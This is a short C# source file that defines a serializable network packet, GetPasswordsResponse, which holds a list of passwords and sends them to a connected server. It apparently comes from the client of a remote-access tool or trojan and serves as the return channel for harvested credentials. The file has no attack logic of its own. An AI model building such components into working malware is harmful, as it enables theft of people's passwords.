using System;
using System.Collections.Generic;
using xClient.Core.Networking;

namespace xClient.Core.Packets.ClientPackets;

[Serializable]
public class GetPasswordsResponse : IPacket
{
	public List<string> Passwords { get; set; }

	public GetPasswordsResponse()
	{
	}

	public GetPasswordsResponse(List<string> data)
	{
		Passwords = data;
	}

	public void Execute(Client client)
	{
		client.Send(this);
	}
}
